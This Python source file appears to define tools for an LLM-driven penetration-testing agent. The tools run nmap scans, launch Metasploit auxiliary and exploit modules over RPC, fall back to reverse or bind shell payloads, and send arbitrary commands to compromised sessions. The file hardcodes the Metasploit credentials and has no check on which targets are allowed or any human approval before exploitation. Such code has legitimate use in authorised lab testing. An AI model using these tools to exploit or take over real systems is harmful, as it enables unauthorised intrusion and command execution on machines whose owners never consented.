from typing import Dict
from langchain_openai import ChatOpenAI
from langchain_groq import ChatGroq
from langchain_ollama import ChatOllama
from langchain_google_genai import ChatGoogleGenerativeAI
from langchain_core.tools import tool
from langgraph.prebuilt import ToolNode
from typing import Any
import docker
import time
from pymetasploit3.msfrpc import MsfRpcClient

METASPLOIT_IP="192.168.34.133"
METASPLOIT_USER="msf"
METASPLOIT_PASSWD="my-super-secret-password"
METASPLOIT_PORT=55553

# LLM Configuration
def get_llm(llm_provider: str, api_key: str, local_model: str = None):
    """Factory function to create appropriate LLM instance"""
    if llm_provider == "ollama":
        return ChatOllama(
            model=local_model or "llama2",
            base_url="http://localhost:11434"
        )
    elif llm_provider == "gemini":
        return ChatGoogleGenerativeAI(
            model="gemini-pro",
            google_api_key=api_key
        )
    elif llm_provider == "openai":
        return ChatOpenAI(
            model="gpt-5-mini",
            openai_api_key=api_key
        )
    elif llm_provider == "groq":
        return ChatGroq(
            model="mixtral-8x7b-32768",
            groq_api_key=api_key
        )
    else:
        raise ValueError(f"Unsupported LLM provider: {llm_provider}")


@tool
def run_nmap_scan(target_ip: str, scan_type: str = "basic") -> str:
    """
    Run nmap scan against target IP
    Args:
        target_ip: IP address to scan
        scan_type: Type of scan
    """
    client = docker.from_env()
    
    # Define scan commands
    scan_commands = {
        "basic": f"nmap -sV {target_ip}",
        "stealth": f"nmap -sS -O {target_ip}",
        "aggressive": f"nmap -A {target_ip}",
        "port_scan": f"nmap -p- {target_ip}",
        "udp": f"nmap -sU {target_ip}",
        "fast_scan": f"nmap -T4 -F {target_ip}",
        "service_scan": f"nmap -sV -sC {target_ip}",
        "top_ports": f"nmap --top-ports 20 {target_ip}",
        "vuln_scan": f"nmap --script vuln {target_ip}"
    }
    
    command = scan_commands.get(scan_type, scan_commands["basic"])
    
    try:
        print(f"  [Docker] Running command: {command}")
        output = client.containers.run('my-nmap:2.0', 
                                        command=command,
                                        remove=True).decode('utf-8')
        
        return f"Nmap scan completed:\n{output}"
        
    except Exception as e:
        return f"Nmap scan failed: {str(e)}"

@tool
def run_metasploit_auxiliary(target_ip: str, module_name: str, options: Dict[str, Any] = None) -> str:
    """
    Run Metasploit auxiliary module using console interface to capture output and do vulnerability assesment
    """
    try:
        msf_client = MsfRpcClient(
            password=METASPLOIT_PASSWD,
            user=METASPLOIT_USER, 
            server=METASPLOIT_IP,
            port=55553, 
            ssl=True
        )
        
        if not msf_client.authenticated:
            return "Failed to authenticate with Metasploit RPC"
        
        # Create a console
        console = msf_client.consoles.console()
        console_id = console.cid
        
        # Build the command string
        commands = [
            f"use auxiliary/{module_name}",
            f"set RHOSTS {target_ip}"
        ]
        
        # Add options if provided
        if options and isinstance(options, dict):
            for key, value in options.items():
                commands.append(f"set {key} {value}")
        
        # Add run command
        commands.append("run")
        
        
        full_output = []
        # Execute commands
        for cmd in commands:
            console.write(cmd)
            # Wait a bit for command to process
            import time
            time.sleep(1)
            
            # Read output
            output = console.read()
            if output['data']:
                full_output.append(f"Command: {cmd}")
                full_output.append(output['data'])
        
        # Wait for module to complete
        time.sleep(5)
        
        # Get final output
        final_output = console.read()
        if final_output['data']:
            full_output.append("Final output:")
            full_output.append(final_output['data'])
        
        # Destroy console
        console.destroy()
        
        result = f"Module '{module_name}' executed against {target_ip}\n"
        result += "Console output:\n"
        result += "\n".join(full_output)
        
        return result
        
    except Exception as e:
        import traceback
        return f"Console execution failed: {str(e)}\nDetails: {traceback.format_exc()}"


@tool
def run_metasploit_exploit(target_ip: str, module_name: str, payload: str, options: Dict[str, Any] = None) -> str:
    """
    Run a Metasploit exploit module to establish a shell.
    Args:
        target_ip: Target IP address.
        module_name: Metasploit exploit module name (e.g., 'unix/ftp/vsftpd_234_backdoor').
        payload: Payload to use (e.g., 'cmd/unix/interact').
        options: Additional options for the module.
    """
    print(f"  [Exploit] Attempting {module_name} with payload {payload} against {target_ip}")
    try:
        msf_client = MsfRpcClient(
            password=METASPLOIT_PASSWD,
            user=METASPLOIT_USER, 
            server=METASPLOIT_IP,
            port=55553, 
            ssl=True
        )

        if not msf_client.authenticated:
            return "Failed to authenticate with Metasploit RPC for exploitation."

        # Get the exploit modules
        exploit = msf_client.modules.use('exploit', module_name)
        print(exploit)
        if not exploit:
            return f"❌ FAILED: Module '{module_name}' could not be loaded. It might be an auxiliary module, misspelled, or may not exist."
           
        
        # Set basic options
        exploit['RHOSTS'] = target_ip
        
        # Validate and set payload
        try:
            # Get compatible payloads for this exploit
            compatible_payloads = exploit.targetpayloads()
            print(f"  [Debug] Available payloads: {compatible_payloads}")  # Show first 10
            
            # Check if requested payload is compatible
            if payload not in compatible_payloads:
                # Try to find a similar compatible payload
                fallback_payloads = [
                    'cmd/unix/interact',
                    'generic/shell_reverse_tcp', 
                    'generic/shell_bind_tcp',
                    'cmd/unix/reverse'
                ]
                
                chosen_payload = None
                for fallback in fallback_payloads:
                    if fallback in compatible_payloads:
                        chosen_payload = fallback
                        break
                
                if chosen_payload:
                    print(f"  [Info] Payload '{payload}' not compatible, using '{chosen_payload}' instead")
                    payload = chosen_payload
                else:
                    # Just use the first available payload
                    if compatible_payloads:
                        payload = compatible_payloads[0]
                        print(f"  [Info] Using first available payload: '{payload}'")
                    else:
                        return f"❌ FAILED: No compatible payloads found for module '{module_name}'"
            
            exploit.payload = payload
            
        except Exception as e:
            return f"❌ FAILED: Payload configuration error: {str(e)}"

        # Add any additional options
        if options and isinstance(options, dict):
            for key, value in options.items():
                try:
                    exploit[key] = value
                except Exception as e:
                    print(f"[Warning] Could not set option {key}={value}: {str(e)}")

        # Execute the exploit
        try:
            print(f"  [Exploit] Executing {module_name} with payload {payload}")
            job_result = exploit.execute(payload=payload)
            
            # Handle different return types from execute()
            if isinstance(job_result, dict) and 'job_id' in job_result:
                job_id = job_result['job_id']
                print(f"  [Exploit] Started as job ID: {job_id}. Waiting for session...")
            elif isinstance(job_result, bool):
                if job_result:
                    print(f"  [Exploit] Exploit executed successfully. Waiting for session...")
                    job_id = None
                else:
                    return f"❌ FAILED: Exploit execution returned False"
            else:
                print(f"  [Exploit] Exploit executed (return type: {type(job_result)}). Waiting for session...")
                job_id = None

        except Exception as e:
            return f"❌ FAILED: Exploit execution failed: {str(e)}"

        # Wait for session creation
        print(f"  [Exploit] Waiting 15 seconds for session creation...")
        time.sleep(15)

        # Check for new sessions
        try:
            sessions = msf_client.sessions.list
            print(type(msf_client.sessions))
            print(f"  [Debug] Current sessions: {list(sessions)}")
            
            if sessions:
                # Look for the most recent session
                latest_session_id = max(sessions.keys(), key=int)
                session = msf_client.sessions.session(latest_session_id)
                
                # Try different ways to get session info
                session_info = "Unknown"
                try:
                    if hasattr(session, 'info'):
                        session_info = session.info
                    elif hasattr(session, 'description'):
                        session_info = session.description  
                    elif hasattr(session, 'type'):
                        session_info = f"Type: {session.type}"
                    
                    # Check if session is from our exploit (basic heuristic)
                    session_is_ours = True  # Assume it's ours if it's the latest
                    
                    if session_is_ours:
                        return f"✅ SUCCESS: Exploit '{module_name}' created session {latest_session_id}. Session info: {session_info}"
                
                except Exception as session_error:
                    print(f"  [Warning] Could not get session info: {session_error}")
                    # Still consider it a success if we have a session
                    return f"✅ SUCCESS: Exploit '{module_name}' created session {latest_session_id}."
            
            # No sessions found
            if job_id:
                try:
                    job_info = msf_client.jobs.info(job_id)
                    return f"❌ FAILED: Exploit '{module_name}' completed but no session was created. Job info: {job_info}"
                except:
                    return f"❌ FAILED: Exploit '{module_name}' completed but no session was created."
            else:
                return f"❌ FAILED: Exploit '{module_name}' completed but no session was created."

        except Exception as e:
            return f"❌ FAILED: Error checking for sessions: {str(e)}"

    except Exception as e:
        import traceback
        return f"❌ FAILED: Exploitation failed with error: {str(e)}\nTraceback: {traceback.format_exc()}"

@tool
def send_shell_command(session_id: int, command: str) -> str:
    """
    Send a command to an established Metasploit shell and return the output.
    
    Args:
        session_id: The ID of the active session to interact with.
        command: The command string to send to the shell.
    
    Returns:
        str: The output of the command or an error message.
    """
    print(f"[Shell] Sending command \'{command}\' to session {session_id}")
    try:
        msf_client = MsfRpcClient(
            password=METASPLOIT_PASSWD,
            user=METASPLOIT_USER, 
            server=METASPLOIT_IP,
            port=METASPLOIT_PORT, 
            ssl=True
        )

        session_id_str = str(session_id)
        
        if session_id_str not in msf_client.sessions.list:
            return f"Error: Session {session_id} not found. Available sessions: {list(msf_client.sessions.list.keys())}"
        
        shell = msf_client.sessions.session(session_id_str)
        
        shell.write(f"{command}\n")
        
        time.sleep(1) # Give the shell a moment to process and return output
        output = shell.read()
        
        if output.strip():
            return f"Command executed successfully.\n---\n{output}\n---"
        else:
            return "Command executed, but no output received or command still processing."
            
    except Exception as e:
        error_msg = f"Failed to send command to shell {session_id}: {str(e)}"
        print(error_msg)
        return error_msg

# Adding tools to the toollist
tools = [run_nmap_scan, run_metasploit_auxiliary, run_metasploit_exploit, send_shell_command]
tool_node = ToolNode(tools)